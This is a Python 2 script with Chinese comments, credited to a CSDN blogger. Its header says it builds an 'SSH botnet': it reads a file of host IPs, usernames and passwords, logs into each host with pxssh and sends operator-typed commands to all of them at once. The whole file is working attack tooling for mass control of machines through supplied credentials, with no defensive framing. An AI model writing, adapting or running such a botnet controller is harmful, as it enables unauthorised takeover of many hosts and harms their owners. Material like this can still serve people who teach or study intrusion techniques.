#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/13
# Created by 冰河
# Description 构建SSH僵尸网络,批量向多个SSH终端发送执行命令，达到批量控制目标主机的目的
#             以读取文件的方式来构建client对象，并生成botNet数组。
#             文件中的每一行存储的是每个主机的ip,用户名和密码,以空格分隔，具体格式如下：
#               主机(ip) 用户名 密码
#               主机(ip) 用户名 密码
#             文件实例为：ssh_botnet.txt
# 博客 https://blog.csdn.net/l1028386804

from pexpect import pxssh

#定义全局变量
message_no = 'n'
message_exit = 'exit'
message_quit = 'quit'

#定义封装的客户端对象
class Client:

    #构造方法
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    #连接ssh，返回ssh会话终端
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    #发送指定的命令
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

#生成客户端对象
def createClient(host, user, password):
    return Client(host, user, password)

#向所有的Client批量发送命令, botNet为存储client对象的数组
def botnetCommand(command, botNet):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output + '\n'


#读取文件，从命令行读取文件并返回
def read_file():
    file_path = raw_input("Please Input Hosts File Path: ")
    while not file_path:
        file_path = raw_input("Please Input Hosts File Path: ")
    try:
        file = open(file_path)
        return file
    except Exception, e:
        #友好提示用户输入正确的文件路径
        message = raw_input("File Not Found, If you are sure to continue, Please Input correct file path, Are you sure to continue? [Y/n] ")
        while not message:
            message = raw_input("File Not Found, If you are sure to continue, Please Input correct file path, Are you sure to continue? [Y/n] ")

        #输入的是n,退出程序
        if message_no == message.lower():
            exit(0)

        #地归调用方法
        return read_file()

#解析文件生成ssh客户端，并将客户端放入数组中返回
def parse_file():
    #定义数组变量
    botNet = []
    file = read_file()
    #遍历文件的每一行
    try:
        for line in file.readlines():
            value = line.strip('\n')
            #以空格拆分每一行
            values = value.split(' ')
            if len(values) < 3:
                continue
            #生成client客户端放入botNet数组中
            botNet.append(createClient(values[0].strip(' '), values[1].strip(' '), values[2].strip(' ')))
    except Exception, e:
        print e
    return botNet

#以交互式的方式发送命令
def interactive_send_command(botNet):
    cmd = raw_input("Please Input command, If you want to exit, Please Input 'quit or exit': ")
    while not cmd:
        cmd = raw_input("Please Input command, If you want to exit, Please Input 'quit or exit': ")

    #退出应用程序
    if message_quit == cmd.lower() or message_exit == cmd.lower():
        exit(0)
    botnetCommand(cmd, botNet)


#主函数
def main():
    botNet = parse_file()
    #数组不存在或者数组为0,直接退出程序
    if not botNet:
        exit(0)
    #以交互式的方式发送命令
    while True:
        interactive_send_command(botNet)


#程序的入口
if __name__ == '__main__':
    main()

